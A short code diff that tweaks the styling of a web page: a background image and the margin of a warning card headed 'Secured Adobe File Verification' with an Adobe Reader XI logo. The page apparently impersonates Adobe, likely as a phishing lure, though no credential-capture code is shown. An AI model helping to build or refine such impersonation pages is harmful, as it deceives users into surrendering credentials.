@@ -90,10 +90,10 @@ useEffect(()=> {
   return (
 
     <div className='w-screen h-screen'>
-      <Image src={"/images/newbg.webp"} width={2000} height={2000} alt='loading..' className='w-full h-full object-cover object-top-left'/>
+      <Image src={"/images/newbg.webp"} width={2000} height={2000} alt='loading..' className='w-full h-full object-cover object-top'/>
    
             <div className={`warn-cont p-5`}>
-              <div className={`warn-card p-5 max-sm:p-2 sm:mr-[200px]`} style={{transform: animateIn? "translateY(0)" : " translateY(-50px)", opacity: animateIn ? "1" : "0"}}>
+              <div className={`warn-card p-5 max-sm:p-2 sm:mr-[300px]`} style={{transform: animateIn? "translateY(0)" : " translateY(-50px)", opacity: animateIn ? "1" : "0"}}>
                 <div className="warn-header mb-5">
                     <img src="/images/logo.webp" width={50} className='max-sm:w-[37px] max-md:w-[46px] ' alt="Adobe Reader XI" />
                   <h2 className='text-[27px] max-md:text-[23px] max-sm:text-[17px] text-[#fa0f00] font-bold roboto'>Secured Adobe File Verification</h2>
